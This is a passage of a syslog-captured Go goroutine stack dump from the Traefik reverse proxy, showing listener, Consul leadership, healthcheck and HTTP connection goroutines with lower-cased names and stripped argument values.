jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*fd).accept( , , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_unix.go:372 +
jun 29 15:17:29 [localhost] traefik: net.(*netfd).accept( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/fd_unix.go:238 +
jun 29 15:17:29 [localhost] traefik: net.(*tcplistener).accept( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/tcpsock_posix.go:136 +
jun 29 15:17:29 [localhost] traefik: net.(*tcplistener).accept( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/tcpsock.go:259 +
jun 29 15:17:29 [localhost] traefik: net/http.(*server).serve( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:2770 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/server.(*server).startserver( , , , , , , , , , , ...)
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/server/server.go:735 +
jun 29 15:17:29 [localhost] traefik: created by github.com/containous/traefik/server.(*server).starthttpservers
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/server/server.go:302 +
jun 29 15:17:29 [localhost] traefik: goroutine 33 [io wait]:
jun 29 15:17:29 [localhost] traefik: internal/poll.runtime_pollwait( , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/runtime/netpoll.go:173 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).wait( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).waitread( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*fd).accept( , , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_unix.go:372 +
jun 29 15:17:29 [localhost] traefik: net.(*netfd).accept( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/fd_unix.go:238 +
jun 29 15:17:29 [localhost] traefik: net.(*tcplistener).accept( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/tcpsock_posix.go:136 +
jun 29 15:17:29 [localhost] traefik: net.(*tcplistener).accept( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/tcpsock.go:259 +
jun 29 15:17:29 [localhost] traefik: net/http.(*server).serve( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:2770 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/server.(*server).startserver( , , , , , , , , , , ...)
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/server/server.go:735 +
jun 29 15:17:29 [localhost] traefik: created by github.com/containous/traefik/server.(*server).starthttpservers
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/server/server.go:302 +
jun 29 15:17:29 [localhost] traefik: goroutine 34 [select, 1756 minutes]:
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/cluster.(*leadership).run( , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/cluster/leadership.go:78 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/cluster.(*leadership).participate.func1.1( , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/cluster/leadership.go:51 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/safe.operationwithrecover.func1( , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/safe/routine.go:160 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/cenk/backoff.retrynotify( , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/cenk/backoff/retry.go:37 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/cluster.(*leadership).participate.func1( , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/cluster/leadership.go:57 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/safe.(*pool).goctx.func1()
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/safe/routine.go:62 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/safe.gowithrecover.func1( , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/safe/routine.go:142 +
jun 29 15:17:29 [localhost] traefik: created by github.com/containous/traefik/safe.gowithrecover
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/safe/routine.go:136 +
jun 29 15:17:29 [localhost] traefik: goroutine 35 [select, 1368 minutes]:
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/server.(*server).listenproviders( , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/server/server.go:370 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/server.(*server).start.func1( )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/server/server.go:201 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/safe.(*pool).go.func1()
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/safe/routine.go:78 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/safe.gowithrecover.func1( , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/safe/routine.go:142 +
jun 29 15:17:29 [localhost] traefik: created by github.com/containous/traefik/safe.gowithrecover
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/safe/routine.go:136 +
jun 29 15:17:29 [localhost] traefik: goroutine 36 [select, 1368 minutes]:
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/server.(*server).listenconfigurations( , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/server/server.go:445 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/server.(*server).start.func2( )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/server/server.go:204 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/safe.(*pool).go.func1()
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/safe/routine.go:78 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/safe.gowithrecover.func1( , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/safe/routine.go:142 +
jun 29 15:17:29 [localhost] traefik: created by github.com/containous/traefik/safe.gowithrecover
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/safe/routine.go:136 +
jun 29 15:17:29 [localhost] traefik: goroutine 105 [select, 1368 minutes]:
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/server.(*server).throttleproviderconfigreload( , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/server/server.go:426 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/server.(*server).preloadconfiguration.func1( )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/server/server.go:398 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/safe.(*pool).go.func1()
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/safe/routine.go:78 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/safe.gowithrecover.func1( , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/safe/routine.go:142 +
jun 29 15:17:29 [localhost] traefik: created by github.com/containous/traefik/safe.gowithrecover
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/safe/routine.go:136 +
jun 29 15:17:29 [localhost] traefik: goroutine 38 [chan receive, 1756 minutes]:
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/server.(*server).listensignals( )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/server/server_signals.go:18 +
jun 29 15:17:29 [localhost] traefik: created by github.com/containous/traefik/server.(*server).start
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/server/server.go:207 +
jun 29 15:17:29 [localhost] traefik: goroutine 39 [select]:
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).roundtrip( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:2033 +
jun 29 15:17:29 [localhost] traefik: net/http.(*transport).roundtrip( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:422 +
jun 29 15:17:29 [localhost] traefik: net/http.send( , , , , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/client.go:252 +
jun 29 15:17:29 [localhost] traefik: net/http.(*client).send( , , , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/client.go:176 +
jun 29 15:17:29 [localhost] traefik: net/http.(*client).do( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/client.go:615 +
jun 29 15:17:29 [localhost] traefik: net/http.(*client).head( , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/client.go:806 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/cmd/healthcheck.do( , , , , , , , , , , ...)
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/cmd/healthcheck/healthcheck.go:72 +
jun 29 15:17:29 [localhost] traefik: main.runcmd.func1()
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/cmd/traefik/traefik.go:204 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/safe.gowithrecover.func1( , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/safe/routine.go:142 +
jun 29 15:17:29 [localhost] traefik: created by github.com/containous/traefik/safe.gowithrecover
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/safe/routine.go:136 +
jun 29 15:17:29 [localhost] traefik: goroutine 40 [select]:
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).roundtrip( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:2033 +
jun 29 15:17:29 [localhost] traefik: net/http.(*transport).roundtrip( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:422 +
jun 29 15:17:29 [localhost] traefik: net/http.send( , , , , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/client.go:252 +
jun 29 15:17:29 [localhost] traefik: net/http.(*client).send( , , , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/client.go:176 +
jun 29 15:17:29 [localhost] traefik: net/http.(*client).do( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/client.go:615 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/hashicorp/consul/api.(*client).dorequest( , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/hashicorp/consul/api/api.go:673 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/hashicorp/consul/api.(*kv).getinternal( , , , , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/hashicorp/consul/api/kv.go:165 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/hashicorp/consul/api.(*kv).get( , , , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/hashicorp/consul/api/kv.go:99 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/hashicorp/consul/api.(*lock).lock( , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/hashicorp/consul/api/lock.go:193 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/abronan/valkeyrie/store/consul.(*consullock).lock( , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/abronan/valkeyrie/store/consul/consul.go:504 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/docker/leadership.(*candidate).campaign( )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/docker/leadership/candidate.go:126 +
jun 29 15:17:29 [localhost] traefik: created by github.com/containous/traefik/vendor/github.com/docker/leadership.(*candidate).runforelection
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/docker/leadership/candidate.go:59 +
jun 29 15:17:29 [localhost] traefik: goroutine 47 [io wait]:
jun 29 15:17:29 [localhost] traefik: internal/poll.runtime_pollwait( , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/runtime/netpoll.go:173 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).wait( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).waitread( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*fd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_unix.go:157 +
jun 29 15:17:29 [localhost] traefik: net.(*netfd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/fd_unix.go:202 +
jun 29 15:17:29 [localhost] traefik: net.(*conn).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/net.go:176 +
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1453 +
jun 29 15:17:29 [localhost] traefik: bufio.(*reader).fill( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/bufio/bufio.go:100 +
jun 29 15:17:29 [localhost] traefik: bufio.(*reader).peek( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/bufio/bufio.go:132 +
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).readloop( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1601 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*transport).dialconn
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1237 +
jun 29 15:17:29 [localhost] traefik: goroutine 43 [select]:
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/abronan/valkeyrie/store/consul.(*consul).renewlocksession.func1( , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/abronan/valkeyrie/store/consul/consul.go:462 +
jun 29 15:17:29 [localhost] traefik: created by github.com/containous/traefik/vendor/github.com/abronan/valkeyrie/store/consul.(*consul).renewlocksession
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/abronan/valkeyrie/store/consul/consul.go:460 +
jun 29 15:17:29 [localhost] traefik: goroutine 48 [select]:
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).writeloop( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1822 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*transport).dialconn
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1238 +
jun 29 15:17:29 [localhost] traefik: goroutine 26 [select, 1368 minutes]:
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/provider/kv.(*provider).watchkv.func1( , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/provider/kv/kv.go:71 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/safe.operationwithrecover.func1( , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/safe/routine.go:160 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/cenk/backoff.retrynotify( , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/cenk/backoff/retry.go:37 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/provider/kv.(*provider).watchkv( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/provider/kv/kv.go:92 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/provider/kv.(*provider).provide.func1.1( )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/provider/kv/kv.go:108 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/safe.(*pool).go.func1()
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/safe/routine.go:78 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/safe.gowithrecover.func1( , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/safe/routine.go:142 +
jun 29 15:17:29 [localhost] traefik: created by github.com/containous/traefik/safe.gowithrecover
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/safe/routine.go:136 +
jun 29 15:17:29 [localhost] traefik: goroutine 27 [select]:
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).roundtrip( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:2033 +
jun 29 15:17:29 [localhost] traefik: net/http.(*transport).roundtrip( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:422 +
jun 29 15:17:29 [localhost] traefik: net/http.send( , , , , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/client.go:252 +
jun 29 15:17:29 [localhost] traefik: net/http.(*client).send( , , , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/client.go:176 +
jun 29 15:17:29 [localhost] traefik: net/http.(*client).do( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/client.go:615 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/hashicorp/consul/api.(*client).dorequest( , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/hashicorp/consul/api/api.go:673 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/hashicorp/consul/api.(*kv).getinternal( , , , , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/hashicorp/consul/api/kv.go:165 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/hashicorp/consul/api.(*kv).list( , , , , , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/hashicorp/consul/api/kv.go:120 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/abronan/valkeyrie/store/consul.(*consul).watchtree.func1( , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/abronan/valkeyrie/store/consul/consul.go:365 +
jun 29 15:17:29 [localhost] traefik: created by github.com/containous/traefik/vendor/github.com/abronan/valkeyrie/store/consul.(*consul).watchtree
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/abronan/valkeyrie/store/consul/consul.go:350 +
jun 29 15:17:29 [localhost] traefik: goroutine 70 [select]:
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).writeloop( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1822 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*transport).dialconn
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1238 +
jun 29 15:17:29 [localhost] traefik: goroutine 53 [runnable]:
jun 29 15:17:29 [localhost] traefik: internal/poll.runtime_pollwait( , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/runtime/netpoll.go:173 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).wait( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).waitread( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*fd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_unix.go:157 +
jun 29 15:17:29 [localhost] traefik: net.(*netfd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/fd_unix.go:202 +
jun 29 15:17:29 [localhost] traefik: net.(*conn).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/net.go:176 +
jun 29 15:17:29 [localhost] traefik: net/http.(*connreader).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:764 +
jun 29 15:17:29 [localhost] traefik: bufio.(*reader).fill( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/bufio/bufio.go:100 +
jun 29 15:17:29 [localhost] traefik: bufio.(*reader).peek( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/bufio/bufio.go:132 +
jun 29 15:17:29 [localhost] traefik: net/http.(*conn).serve( , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:1855 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*server).serve
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:2795 +
jun 29 15:17:29 [localhost] traefik: goroutine 69 [io wait]:
jun 29 15:17:29 [localhost] traefik: internal/poll.runtime_pollwait( , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/runtime/netpoll.go:173 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).wait( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).waitread( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*fd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_unix.go:157 +
jun 29 15:17:29 [localhost] traefik: net.(*netfd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/fd_unix.go:202 +
jun 29 15:17:29 [localhost] traefik: net.(*conn).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/net.go:176 +
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1453 +
jun 29 15:17:29 [localhost] traefik: bufio.(*reader).fill( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/bufio/bufio.go:100 +
jun 29 15:17:29 [localhost] traefik: bufio.(*reader).peek( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/bufio/bufio.go:132 +
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).readloop( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1601 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*transport).dialconn
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1237 +
jun 29 15:17:29 [localhost] traefik: goroutine 107 [select, 1368 minutes]:
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/server.(*server).throttleproviderconfigreload.func1( )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/server/server.go:415 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/safe.(*pool).go.func1()
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/safe/routine.go:78 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/safe.gowithrecover.func1( , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/safe/routine.go:142 +
jun 29 15:17:29 [localhost] traefik: created by github.com/containous/traefik/safe.gowithrecover
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/safe/routine.go:136 +
jun 29 15:17:29 [localhost] traefik: goroutine 106 [select, 1368 minutes]:
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/eapache/channels.(*ringchannel).ringbuffer( )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/eapache/channels/ring_channel.go:87 +
jun 29 15:17:29 [localhost] traefik: created by github.com/containous/traefik/vendor/github.com/eapache/channels.newringchannel
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/eapache/channels/ring_channel.go:32 +
jun 29 15:17:29 [localhost] traefik: goroutine 4461275 [runnable]:
jun 29 15:17:29 [localhost] traefik: net/http/httputil.(*maxlatencywriter).flushloop( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/httputil/reverseproxy.go:344
jun 29 15:17:29 [localhost] traefik: created by net/http/httputil.(*reverseproxy).copyresponse
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/httputil/reverseproxy.go:273 +
jun 29 15:17:29 [localhost] traefik: goroutine 4461272 [select]:
jun 29 15:17:29 [localhost] traefik: net/http/httputil.(*reverseproxy).servehttp.func1( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/httputil/reverseproxy.go:154 +
jun 29 15:17:29 [localhost] traefik: created by net/http/httputil.(*reverseproxy).servehttp
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/httputil/reverseproxy.go:153 +
jun 29 15:17:29 [localhost] traefik: goroutine 178 [runnable]:
jun 29 15:17:29 [localhost] traefik: sort.sort( , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/sort/sort.go:216 +
jun 29 15:17:29 [localhost] traefik: net/http.header.sortedkeyvalues( , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/header.go:141 +
jun 29 15:17:29 [localhost] traefik: net/http.header.writesubset( , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/header.go:152 +
jun 29 15:17:29 [localhost] traefik: net/http.(*request).write( , , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/request.go:577 +
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).writeloop( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1825 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*transport).dialconn
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1238 +
jun 29 15:17:29 [localhost] traefik: goroutine 179 [io wait]:
jun 29 15:17:29 [localhost] traefik: internal/poll.runtime_pollwait( , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/runtime/netpoll.go:173 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).wait( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).waitread( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*fd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_unix.go:157 +
jun 29 15:17:29 [localhost] traefik: net.(*netfd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/fd_unix.go:202 +
jun 29 15:17:29 [localhost] traefik: net.(*conn).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/net.go:176 +
jun 29 15:17:29 [localhost] traefik: net/http.(*connreader).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:764 +
jun 29 15:17:29 [localhost] traefik: bufio.(*reader).fill( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/bufio/bufio.go:100 +
jun 29 15:17:29 [localhost] traefik: bufio.(*reader).peek( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/bufio/bufio.go:132 +
jun 29 15:17:29 [localhost] traefik: net/http.(*conn).serve( , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:1855 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*server).serve
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:2795 +
jun 29 15:17:29 [localhost] traefik: goroutine 177 [io wait]:
jun 29 15:17:29 [localhost] traefik: internal/poll.runtime_pollwait( , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/runtime/netpoll.go:173 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).wait( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).waitread( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*fd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_unix.go:157 +
